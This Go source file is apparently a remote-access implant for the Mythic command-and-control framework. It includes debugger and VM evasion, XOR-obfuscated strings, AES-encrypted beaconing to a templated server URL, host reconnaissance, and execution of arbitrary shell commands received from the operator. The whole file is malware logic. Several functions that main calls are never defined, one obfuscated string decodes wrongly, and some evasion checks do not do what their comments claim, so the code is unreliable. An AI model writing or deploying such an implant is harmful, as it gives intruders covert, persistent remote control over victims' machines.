package main

import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "crypto/sha256"
        "encoding/base64"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "io"
        "math"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strconv"
        "strings"
        "syscall"
        "time"
        "unsafe"
)

// Obfuscated strings using XOR encoding
var (
        // "phantom"
        agentName = xorDecode([]byte{0x70, 0x68, 0x61, 0x6e, 0x74, 0x6f, 0x6d}, 0x42)
        // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        defaultUserAgent = xorDecode([]byte{0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x33, 0x36}, 0x00)
)

// Configuration structure
type Config struct {
        ServerURL   string `json:"server_url"`
        Sleep       int    `json:"sleep"`
        Jitter      int    `json:"jitter"`
        UserAgent   string `json:"user_agent"`
        AESKey      string `json:"aes_key"`
        Debug       bool   `json:"debug"`
}

// Agent structure
type Agent struct {
        Config     Config
        AgentID    string
        Hostname   string
        Username   string
        OS         string
        Arch       string
        PID        int
        PPID       int
        IP         string
        AESCipher  cipher.AEAD
}

// Message structures for Mythic communication
type CheckinMessage struct {
        Action       string            `json:"action"`
        IP           string            `json:"ip"`
        OS           string            `json:"os"`
        User         string            `json:"user"`
        Host         string            `json:"host"`
        PID          int               `json:"pid"`
        UUID         string            `json:"uuid"`
        Architecture string            `json:"architecture"`
        Domain       string            `json:"domain"`
        Integrity    int               `json:"integrity_level"`
        ExternalIP   string            `json:"external_ip"`
        ProcessName  string            `json:"process_name"`
        Sleep        int               `json:"sleep_info"`
        Jitter       int               `json:"jitter_info"`
        Ips          []string          `json:"ips"`
        ExtraInfo    map[string]string `json:"extra_info"`
}

type TaskMessage struct {
        Action string `json:"action"`
        Tasks  []Task `json:"tasks"`
}

type Task struct {
        ID          string                 `json:"id"`
        Command     string                 `json:"command"`
        Parameters  map[string]interface{} `json:"parameters"`
        Token       int                    `json:"token"`
        Timestamp   string                 `json:"timestamp"`
}

type TaskResponse struct {
        Action   string      `json:"action"`
        TaskID   string      `json:"task_id"`
        UserOutput string    `json:"user_output"`
        Completed  bool      `json:"completed"`
        Status     string    `json:"status"`
        FileID     string    `json:"file_id,omitempty"`
}

// Anti-debugging and evasion techniques
func antiDebug() {
        if runtime.GOOS == "windows" {
                // Check for debugger presence using IsDebuggerPresent
                kernel32 := syscall.NewLazyDLL(xorDecode([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}, 0x00))
                isDebuggerPresent := kernel32.NewProc(xorDecode([]byte{0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74}, 0x00))
                
                ret, _, _ := isDebuggerPresent.Call()
                if ret != 0 {
                        // Exit if debugger detected
                        os.Exit(0)
                }
                
                // Check for remote debugger
                checkRemoteDebugger := kernel32.NewProc(xorDecode([]byte{0x43, 0x68, 0x65, 0x63, 0x6b, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74}, 0x00))
                var isRemoteDebugger bool
                checkRemoteDebugger.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&isRemoteDebugger)))
                if isRemoteDebugger {
                        os.Exit(0)
                }
        }
}

// Process hollowing detection
func detectProcessHollowing() {
        if runtime.GOOS == "windows" {
                // Simple check for process hollowing indicators
                kernel32 := syscall.NewLazyDLL(xorDecode([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}, 0x00))
                getCurrentProcess := kernel32.NewProc(xorDecode([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73}, 0x00))
                
                handle, _, _ := getCurrentProcess.Call()
                if handle == 0 {
                        os.Exit(0)
                }
        }
}

// VM detection
func detectVM() {
        if runtime.GOOS == "windows" {
                // Check for VM artifacts
                vmArtifacts := []string{
                        xorDecode([]byte{0x56, 0x4d, 0x77, 0x61, 0x72, 0x65}, 0x00), // VMware
                        xorDecode([]byte{0x56, 0x42, 0x4f, 0x58}, 0x00),             // VBOX
                        xorDecode([]byte{0x51, 0x45, 0x4d, 0x55}, 0x00),             // QEMU
                }
                
                for _, artifact := range vmArtifacts {
                        if strings.Contains(strings.ToUpper(getSystemInfo()), strings.ToUpper(artifact)) {
                                // Sleep for random time to avoid detection
                                time.Sleep(time.Duration(getRandomInt(300, 600)) * time.Second)
                        }
                }
        }
}

// XOR decoding function for obfuscated strings
func xorDecode(data []byte, key byte) string {
        decoded := make([]byte, len(data))
        for i, b := range data {
                decoded[i] = b ^ key
        }
        return string(decoded)
}

// Generate random integer between min and max
func getRandomInt(min, max int) int {
        b := make([]byte, 1)
        rand.Read(b)
        return min + int(b[0])%(max-min+1)
}

// Get system information
func getSystemInfo() string {
        if runtime.GOOS == "windows" {
                cmd := exec.Command(xorDecode([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x69, 0x6e, 0x66, 0x6f}, 0x00))
                output, _ := cmd.Output()
                return string(output)
        }
        return ""
}

// AES encryption/decryption functions
func (a *Agent) encrypt(data []byte) ([]byte, error) {
        if a.AESCipher == nil {
                return data, nil
        }
        
        nonce := make([]byte, a.AESCipher.NonceSize())
        if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
                return nil, err
        }
        
        ciphertext := a.AESCipher.Seal(nonce, nonce, data, nil)
        return ciphertext, nil
}

func (a *Agent) decrypt(data []byte) ([]byte, error) {
        if a.AESCipher == nil {
                return data, nil
        }
        
        nonceSize := a.AESCipher.NonceSize()
        if len(data) < nonceSize {
                return nil, fmt.Errorf("ciphertext too short")
        }
        
        nonce, ciphertext := data[:nonceSize], data[nonceSize:]
        plaintext, err := a.AESCipher.Open(nil, nonce, ciphertext, nil)
        if err != nil {
                return nil, err
        }
        
        return plaintext, nil
}

// Initialize AES cipher
func (a *Agent) initAES() error {
        if a.Config.AESKey == "" {
                return nil
        }
        
        keyBytes, err := hex.DecodeString(a.Config.AESKey)
        if err != nil {
                // Generate key from string
                hash := sha256.Sum256([]byte(a.Config.AESKey))
                keyBytes = hash[:]
        }
        
        block, err := aes.NewCipher(keyBytes)
        if err != nil {
                return err
        }
        
        gcm, err := cipher.NewGCM(block)
        if err != nil {
                return err
        }
        
        a.AESCipher = gcm
        return nil
}

// HTTP request with evasion
func (a *Agent) makeRequest(method, url string, data []byte) (*http.Response, error) {
        client := &http.Client{
                Timeout: 30 * time.Second,
        }
        
        var req *http.Request
        var err error
        
        if data != nil {
                encrypted, err := a.encrypt(data)
                if err != nil {
                        return nil, err
                }
                req, err = http.NewRequest(method, url, bytes.NewBuffer(encrypted))
        } else {
                req, err = http.NewRequest(method, url, nil)
        }
        
        if err != nil {
                return nil, err
        }
        
        // Set headers for evasion
        req.Header.Set("User-Agent", a.Config.UserAgent)
        req.Header.Set("Content-Type", "application/octet-stream")
        req.Header.Set("Accept", "*/*")
        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
        req.Header.Set("Accept-Encoding", "gzip, deflate")
        req.Header.Set("Connection", "keep-alive")
        
        // Add random headers for evasion
        randomHeaders := map[string]string{
                "X-Requested-With": "XMLHttpRequest",
                "Cache-Control":    "no-cache",
                "Pragma":           "no-cache",
        }
        
        for k, v := range randomHeaders {
                if getRandomInt(0, 1) == 1 {
                        req.Header.Set(k, v)
                }
        }
        
        return client.Do(req)
}

// Get host information
func (a *Agent) getHostInfo() {
        a.Hostname, _ = os.Hostname()
        a.OS = runtime.GOOS
        a.Arch = runtime.GOARCH
        a.PID = os.Getpid()
        a.PPID = os.Getppid()
        
        // Get username
        if runtime.GOOS == "windows" {
                a.Username = os.Getenv("USERNAME")
        } else {
                a.Username = os.Getenv("USER")
        }
        
        // Get IP address (simplified)
        a.IP = "127.0.0.1" // This should be implemented to get actual IP
}

// Generate agent UUID
func (a *Agent) generateUUID() {
        data := fmt.Sprintf("%s-%s-%d-%d", a.Hostname, a.Username, a.PID, time.Now().Unix())
        hash := sha256.Sum256([]byte(data))
        a.AgentID = hex.EncodeToString(hash[:16])
}

// Initial checkin with Mythic
func (a *Agent) checkin() error {
        checkinMsg := CheckinMessage{
                Action:       "checkin",
                IP:           a.IP,
                OS:           a.OS,
                User:         a.Username,
                Host:         a.Hostname,
                PID:          a.PID,
                UUID:         a.AgentID,
                Architecture: a.Arch,
                Domain:       "",
                Integrity:    2,
                ExternalIP:   "",
                ProcessName:  os.Args[0],
                Sleep:        a.Config.Sleep,
                Jitter:       a.Config.Jitter,
                Ips:          []string{a.IP},
                ExtraInfo:    make(map[string]string),
        }
        
        jsonData, err := json.Marshal(checkinMsg)
        if err != nil {
                return err
        }
        
        url := a.Config.ServerURL + "/api/v1.4/agent_message"
        resp, err := a.makeRequest("POST", url, jsonData)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Get tasks from Mythic
func (a *Agent) getTasks() ([]Task, error) {
        taskMsg := TaskMessage{
                Action: "get_tasking",
                Tasks:  []Task{},
        }
        
        jsonData, err := json.Marshal(taskMsg)
        if err != nil {
                return nil, err
        }
        
        url := a.Config.ServerURL + "/api/v1.4/agent_message"
        resp, err := a.makeRequest("POST", url, jsonData)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        decrypted, err := a.decrypt(body)
        if err != nil {
                return nil, err
        }
        
        var taskResponse TaskMessage
        err = json.Unmarshal(decrypted, &taskResponse)
        if err != nil {
                return nil, err
        }
        
        return taskResponse.Tasks, nil
}

// Execute shell command
func (a *Agent) executeShell(command string) string {
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("/bin/sh", "-c", command)
        }
        
        output, err := cmd.CombinedOutput()
        if err != nil {
                return fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), string(output))
        }
        
        return string(output)
}

// Process tasks
func (a *Agent) processTask(task Task) TaskResponse {
        response := TaskResponse{
                Action:    "post_response",
                TaskID:    task.ID,
                Completed: true,
                Status:    "success",
        }
        
        switch task.Command {
        case "shell":
                if cmd, ok := task.Parameters["command"].(string); ok {
                        response.UserOutput = a.executeShell(cmd)
                } else {
                        response.UserOutput = "Error: No command specified"
                        response.Status = "error"
                }
                
        case "sleep":
                if sleepTime, ok := task.Parameters["time"].(float64); ok {
                        a.Config.Sleep = int(sleepTime)
                        response.UserOutput = fmt.Sprintf("Sleep updated to %d seconds", a.Config.Sleep)
                } else {
                        response.UserOutput = "Error: Invalid sleep time"
                        response.Status = "error"
                }
                
        case "jitter":
                if jitterVal, ok := task.Parameters["jitter"].(float64); ok {
                        a.Config.Jitter = int(jitterVal)
                        response.UserOutput = fmt.Sprintf("Jitter updated to %d%%", a.Config.Jitter)
                } else {
                        response.UserOutput = "Error: Invalid jitter value"
                        response.Status = "error"
                }
                
        case "exit":
                response.UserOutput = "Agent exiting..."
                a.sendTaskResponse(response)
                os.Exit(0)
                
        default:
                response.UserOutput = fmt.Sprintf("Unknown command: %s", task.Command)
                response.Status = "error"
        }
        
        return response
}

// Send task response
func (a *Agent) sendTaskResponse(response TaskResponse) error {
        jsonData, err := json.Marshal(response)
        if err != nil {
                return err
        }
        
        url := a.Config.ServerURL + "/api/v1.4/agent_message"
        resp, err := a.makeRequest("POST", url, jsonData)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Calculate sleep with jitter
func (a *Agent) calculateSleep() time.Duration {
        if a.Config.Jitter == 0 {
                return time.Duration(a.Config.Sleep) * time.Second
        }
        
        jitterAmount := float64(a.Config.Sleep) * (float64(a.Config.Jitter) / 100.0)
        minSleep := float64(a.Config.Sleep) - jitterAmount
        maxSleep := float64(a.Config.Sleep) + jitterAmount
        
        sleepTime := minSleep + (maxSleep-minSleep)*float64(getRandomInt(0, 100))/100.0
        return time.Duration(math.Max(1, sleepTime)) * time.Second
}

// Main execution loop
func (a *Agent) run() {
        // Initial checkin
        if err := a.checkin(); err != nil && a.Config.Debug {
                fmt.Printf("Checkin failed: %v\n", err)
        }
        
        for {
                // Get tasks
                tasks, err := a.getTasks()
                if err != nil {
                        if a.Config.Debug {
                                fmt.Printf("Failed to get tasks: %v\n", err)
                        }
                } else {
                        // Process each task
                        for _, task := range tasks {
                                response := a.processTask(task)
                                if err := a.sendTaskResponse(response); err != nil && a.Config.Debug {
                                        fmt.Printf("Failed to send response: %v\n", err)
                                }
                        }
                }
                
                // Sleep with jitter
                sleepDuration := a.calculateSleep()
                time.Sleep(sleepDuration)
        }
}

func main() {
        // Comprehensive evasion checks
        if performEvasionChecks() {
                // Threat detected - exit silently
                os.Exit(0)
        }
        
        // Environmental validation
        if !validateEnvironment() {
                // Wrong environment - exit
                os.Exit(0)
        }
        
        // Time-based evasion
        timeBasedEvasion()
        
        // Initialize agent
        agent := &Agent{
                Config: Config{
                        ServerURL: "{{MYTHIC_HTTP}}",
                        Sleep:     5,
                        Jitter:    10,
                        UserAgent: defaultUserAgent,
                        AESKey:    "{{AESPSK}}",
                        Debug:     false,
                },
        }
        
        // Initialize AES encryption
        if err := agent.initAES(); err != nil && agent.Config.Debug {
                fmt.Printf("AES init failed: %v\n", err)
        }
        
        // Get host information
        agent.getHostInfo()
        agent.generateUUID()
        
        // Start main loop with evasive sleep
        agent.runWithEvasion()
}

// Enhanced run method with evasion
func (a *Agent) runWithEvasion() {
        // Initial checkin
        if err := a.checkin(); err != nil && a.Config.Debug {
                fmt.Printf("Checkin failed: %v\n", err)
        }
        
        for {
                // Periodic evasion checks during execution
                if getRandomInt(0, 10) == 0 { // 10% chance each loop
                        if performEvasionChecks() {
                                os.Exit(0)
                        }
                }
                
                // Get tasks
                tasks, err := a.getTasks()
                if err != nil {
                        if a.Config.Debug {
                                fmt.Printf("Failed to get tasks: %v\n", err)
                        }
                } else {
                        // Process each task
                        for _, task := range tasks {
                                response := a.processTask(task)
                                if err := a.sendTaskResponse(response); err != nil && a.Config.Debug {
                                        fmt.Printf("Failed to send response: %v\n", err)
                                }
                        }
                }
                
                // Sleep with advanced evasion
                sleepDuration := a.calculateSleep()
                evasiveSleep(sleepDuration)
        }
}